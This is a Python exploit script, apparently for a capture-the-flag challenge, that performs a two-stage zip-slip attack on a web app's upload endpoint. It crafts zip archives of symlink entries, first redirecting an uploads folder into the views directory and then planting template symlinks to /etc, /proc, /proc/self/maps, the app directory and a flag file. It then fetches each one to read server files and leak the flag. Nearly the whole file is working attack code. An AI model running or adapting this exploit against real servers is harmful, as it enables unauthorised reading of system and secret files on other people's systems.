#!/usr/bin/env python3
"""V16 verify: does a1 (fs.readFile utf8) yield a directory listing / filename
disclosure for any dir-like or /proc magic path?  Goal = leak flag filename
a8e6a1fd8267f11edbcf  (or the flag value/secret directly).

Two-stage zip-slip via symlink, unique 'v16' namespace.
"""
import io
import sys
import zipfile

import requests

UA = {"User-Agent": "v16probe"}
TAG = "v16"
STAGE1 = "vv16"  # uploads/vv16 -> ../views

FLAG_NAME = "a8e6a1fd8267f11edbcf"
FLAG_VAL = "grey{local_test_d3adb33fc0ffee}"
SECRET = "d3adb33fc0ffee"


def zinfo_symlink(name):
    zi = zipfile.ZipInfo(name)
    zi.create_system = 3
    zi.external_attr = (0o120777 & 0xFFFF) << 16
    return zi


def build(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        for name, data in entries:
            z.writestr(zinfo_symlink(name), data)
    return buf.getvalue()


def upload(base, blob, fname):
    r = requests.post(
        f"{base}/upload",
        files={"photos": (fname, blob, "application/zip")},
        allow_redirects=False, timeout=30, headers=UA,
    )
    return r.status_code, r.headers.get("location", "")


def get(base, path):
    return requests.get(f"{base}{path}", timeout=30, headers=UA, allow_redirects=False)


# view-name -> target. Directory-like + proc text pseudo-files that might list names.
TARGETS = {
    f"d_root_{TAG}": "/",
    f"d_proc_{TAG}": "/proc",
    f"d_procself_{TAG}": "/proc/self",
    f"d_selfroot_{TAG}": "/proc/self/root",
    f"d_proc1root_{TAG}": "/proc/1/root",
    f"d_dpkg_{TAG}": "/var/lib/dpkg/info",
    f"d_sysblk_{TAG}": "/sys/block",
    f"d_varcache_{TAG}": "/var/cache",
    f"d_uploads_{TAG}": "/app/uploads",
    f"d_app_{TAG}": "/app",
    f"d_etc_{TAG}": "/etc",
    f"d_dev_{TAG}": "/dev",
    f"d_tmp_{TAG}": "/tmp",
    # proc text pseudo-files (readable as text)
    f"t_mounts_{TAG}": "/proc/mounts",
    f"t_mountinfo_{TAG}": "/proc/self/mountinfo",
    f"t_partitions_{TAG}": "/proc/partitions",
    f"t_filesystems_{TAG}": "/proc/filesystems",
    f"t_maps_{TAG}": "/proc/self/maps",
    f"t_cmdline_{TAG}": "/proc/1/cmdline",
    f"t_smaps_{TAG}": "/proc/self/smaps",
    # cwd-relative / fd dirs
    f"t_selfcwd_{TAG}": "/proc/self/cwd",
    f"t_selffd_{TAG}": "/proc/self/fd",
    # ground-truth sanity: known flag (must 500 due to a2 grey filter)
    f"gt_known_{TAG}": f"/flag-{FLAG_NAME}.txt",
}


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:34267"

    print(f"== stage1: {STAGE1} -> ../views ==")
    print(upload(base, build([(STAGE1, "../views")]), f"s1_{TAG}.zip"))

    print(f"== stage2: plant {len(TARGETS)} view symlinks ==")
    entries = [(f"{STAGE1}/{name}.ejs", tgt) for name, tgt in TARGETS.items()]
    print(upload(base, build(entries), f"s2_{TAG}.zip"))

    print("\n== READ PROBES ==")
    hit = None
    for name, tgt in TARGETS.items():
        r = get(base, f"/{name}")
        body = r.content
        txt = body.decode("utf-8", "replace")
        has_name = FLAG_NAME in txt
        has_val = FLAG_VAL in txt
        has_sec = SECRET in txt
        flagstar = "flag-" in txt
        print(f"\n--- /{name} -> {tgt}  [{r.status_code}] len={len(body)} "
              f"name={has_name} val={has_val} sec={has_sec} 'flag-'={flagstar}")
        # show a slice
        print(repr(txt[:300]))
        if has_val or has_sec:
            hit = ("FLAG", name, tgt)
        elif has_name and hit is None:
            hit = ("NAME", name, tgt)
        elif flagstar and hit is None:
            hit = ("FLAGSTAR", name, tgt)

    print("\n== RESULT ==")
    print("HIT:", hit)


if __name__ == "__main__":
    main()
